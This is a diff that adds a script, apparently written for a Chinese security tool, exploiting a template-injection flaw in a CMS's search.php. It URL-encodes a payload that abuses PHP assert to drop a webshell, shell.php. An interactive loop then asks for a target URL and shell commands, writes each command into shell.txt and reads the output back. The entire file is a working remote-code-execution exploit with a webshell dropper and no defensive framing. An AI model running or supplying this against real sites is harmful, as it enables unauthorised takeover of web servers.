@@ -1,0 +1,33 @@
+#define getshellpayload = searchtype=5&order=%7D%7Bend%20if%7D%7Bif%3A1%29print%5Fr%28%24%5FPOST%5Bfunc%5D%28%24%5FPOST%5Bcmd%5D%29%29%3B%2F%2F%7D%7Bend%20if%7D&func=assert&cmd=fwrite%28fopen%28%22shell.php%22%2C%22w%22%29%2C%27%3C%3Fphp%20%40eval%28fread%28fopen%28%22shell.txt%22%2C%22r%22%29%2Cfilesize%28%22shell.txt%22%29%29%29%3B%20%3F%3E%27%29
+#define injectionTxtpayloadqian = searchtype=5&order=%7D%7Bend%20if%7D%7Bif%3A1%29print%5Fr%28%24%5FPOST%5Bfunc%5D%28%24%5FPOST%5Bcmd%5D%29%29%3B%2F%2F%7D%7Bend%20if%7D&func=assert&cmd=fwrite%28fopen%28%22shell.txt%22%2C%22w%22%29%2C%27system%28%22
+#define injectionTxtpayloadhou = %22%29%3B%27%29
+function injectionTxt(url,cmd){
+	return HttpPost(url."/search.php",injectionTxtpayloadqian.URLEncode(cmd).injectionTxtpayloadhou,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
+}
+function GetShell(url){
+	return HttpPost(url."/search.php",getshellpayload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
+}
+function GetRes(url){
+	res = HttpGet(url."/shell.php","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
+	return res[0];
+}
+function main(args)
+{
+	print("请输入要测试的URL:");
+	webUrl = input();
+	res = GetShell(webUrl);
+	if(StrFindStr(res[1],"200 OK",0) == "-1"){
+		print("getshell失败");
+		return "";
+	}
+	while(1 == 1){
+		print("请输入要执行的命令(输入exit退出)");
+		cmd = input();
+		if(cmd == "exit"){
+			break;
+		}
+		injectionTxt(webUrl,cmd);
+		print(GetRes(webUrl));
+	}
+	
+}
